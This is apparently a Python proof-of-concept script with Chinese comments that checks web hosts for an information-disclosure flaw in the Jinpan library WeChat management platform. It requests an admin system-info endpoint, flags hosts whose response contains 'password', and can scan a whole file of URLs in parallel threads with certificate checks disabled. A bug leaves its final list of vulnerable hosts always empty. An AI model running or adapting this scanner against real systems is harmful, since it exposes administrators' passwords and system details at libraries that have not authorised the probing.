#使用方法 python 文件.py -u url or  -f file
# 金盘图书馆微信管理平台存在敏感信息泄露漏洞编号
from urllib.parse import urlsplit
import argparse
import requests
import re
import threading
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning
parser = argparse.ArgumentParser(description="python3 demo.py -u [login_url] ")

# 对这个解析对象添加几个命令行参数，type为输入类型，metavar用来控制部分命令行参数的显示，require=True为当用户输入错误时，系统返回提示正确的输入方式，help为描述
parser.add_argument('-u', '--url', help='URL 参数')
parser.add_argument('-f', '--file', help='file 参数')
headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Cookie":"JSESSIONID=7f4e676c-ced2-4d03-9a03-39e066a3a2ca"
}
payload = "/admin/weichatcfg/getsysteminfo"
vulurl = []
def urlCheck(url):
    parsed_url = urlsplit(url)
    url = parsed_url.scheme + "://"+parsed_url.netloc
    testUrl(url)

def testUrl(url):
    try:
        res = requests.get(url=url + payload, headers=headers, verify=False, timeout=4)
        if res.status_code == 200 and ("password" in res.text):
            print(url + "漏洞存在")
        else:
            print(url + "漏洞不存在")
    except RequestException:
            print("请求超时")
def main():
    args = parser.parse_args()
    if args.url:
        urlCheck(args.url)
    elif args.file:
        threads_queue = []
        with open(args.file, 'r') as file:
            for line in file:
                line = line.strip()
                read_thread = threading.Thread(target=urlCheck, args=(line,))
                threads_queue.append(read_thread)
                read_thread.start()
            for thread in threads_queue:
                thread.join()

    print("\n存在漏洞列表：")
    for url in vulurl:
        print(url + "  [+]漏洞存在！！！")
if __name__ == "__main__":
    main()